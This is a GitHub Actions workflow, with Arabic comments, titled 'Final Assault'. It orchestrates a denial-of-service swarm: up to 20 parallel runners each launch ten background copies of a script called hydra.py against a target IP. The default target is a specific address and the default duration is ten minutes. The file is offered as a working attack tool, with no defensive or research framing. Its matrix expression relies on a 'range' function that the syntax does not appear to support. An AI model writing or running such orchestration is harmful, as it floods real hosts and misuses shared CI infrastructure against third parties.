# اسم الـ Workflow: Final Assault (v21 - MAX PRESSURE)
name: Final Assault (v21)

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP Address'
        required: true
        default: '63.246.154.12'
      duration:
        description: 'Attack Duration (seconds)'
        required: true
        default: '600' # 10 minutes
      swarm_size:
        description: 'Swarm Size (Number of Machines, max ~20)'
        required: true
        default: '20'
      concurrency_per_machine:
        description: 'Concurrency per Machine (Number of processes)'
        required: true
        default: '10' # تشغيل 10 نسخ على كل جهاز من الـ 20

jobs:
  # المهمة التي سيتم تكرارها 20 مرة
  unleash_assault_cell:
    runs-on: ubuntu-latest
    
    # استراتيجية السرب: تشغيل هذه المهمة 20 مرة بشكل متوازٍ
    strategy:
      fail-fast: false
      matrix:
        instance_id: ${{ fromJson(format('[{0}]', join(range(1, github.event.inputs.swarm_size + 1), ','))) }}

    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v3
        with:
          python-version: 3.9

      - name: Prepare Environment
        id: prepare
        run: |
          # تعديل الكود بالمدخلات في ملف hydra.py
          sed -i "s/TARGET_IP = .*/TARGET_IP = \"${{ github.event.inputs.target_ip }}\"/" hydra.py
          sed -i "s/DURATION = .*/DURATION = ${{ github.event.inputs.duration }}/" hydra.py
          
          # حساب مدة الـ timeout
          TIMEOUT_MINS=$(( (${{ github.event.inputs.duration }} / 60) + 5 ))
          echo "timeout=$TIMEOUT_MINS" >> $GITHUB_OUTPUT

      - name: LAUNCH ASSAULT CELL #${{ matrix.instance_id }}
        timeout-minutes: ${{ fromJson(steps.prepare.outputs.timeout) }}
        run: |
          echo "Assault Cell #${{ matrix.instance_id }} | Launching ${{ github.event.inputs.concurrency_per_machine }} processes..."
          
          # --- تعدد المهام داخل كل جهاز ---
          # تشغيل الكود 10 مرات في الخلفية على نفس الجهاز
          for i in $(seq 1 ${{ github.event.inputs.concurrency_per_machine }}); do
            echo "Launching process $i on cell #${{ matrix.instance_id }}..."
            python3 -u hydra.py &
          done
          
          echo "All processes launched. Cell #${{ matrix.instance_id }} is now at maximum pressure. Waiting for duration..."
          # الانتظار لضمان استمرار عمل العمليات في الخلفية
          wait
